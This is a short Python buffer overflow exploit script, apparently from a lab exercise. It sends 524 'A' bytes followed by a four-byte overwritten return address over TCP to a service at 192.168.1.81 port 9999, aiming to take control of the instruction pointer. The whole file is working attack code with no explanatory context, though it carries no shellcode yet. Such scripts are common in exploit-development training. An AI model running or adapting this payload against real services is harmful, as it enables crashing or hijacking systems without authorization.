import sys, socket


buffer = b"A" * 524 + b"\xF3\x12\x17\x31"

print("Sending Payload")
payload = buffer + b'\r\n'
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.81',9999))
s.send(payload)
s.close()

